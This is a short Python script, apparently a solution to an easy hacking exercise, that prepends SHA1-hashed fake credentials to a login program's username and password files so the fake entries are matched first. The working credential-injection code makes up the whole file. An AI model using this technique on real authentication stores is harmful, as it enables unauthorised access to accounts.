##This works by inserting a new username and password at the start of the file
##This works because the login program searches from the start to end so the
##fake details are picked up instead

from hashlib import sha1

usernames = ""
passwords = ""

def stealData():
    global usernames
    global passwords
    with open("python_easy_5_usernames.txt", "r+", encoding="utf-8") as file:
        usernames = file.read()

    with open("python_easy_5_passwords.txt", "r+", encoding="utf-8") as file:
        passwords = file.read()

def hack():
    while True:
        stealData()
        username = input("Username to insert / hack. ")
        password = input("Password to use. ")
        
        with open("python_easy_5_usernames.txt", "w+", encoding="utf-8") as file:
            file.write(sha1(username.encode("utf-8")).hexdigest() + "\n" + usernames)
        
        with open("python_easy_5_passwords.txt", "w+", encoding="utf-8") as file:
            file.write(sha1(password.encode("utf-8")).hexdigest() + "\n" + passwords)
        
        print("Done.")

if __name__ == "__main__":
    hack()
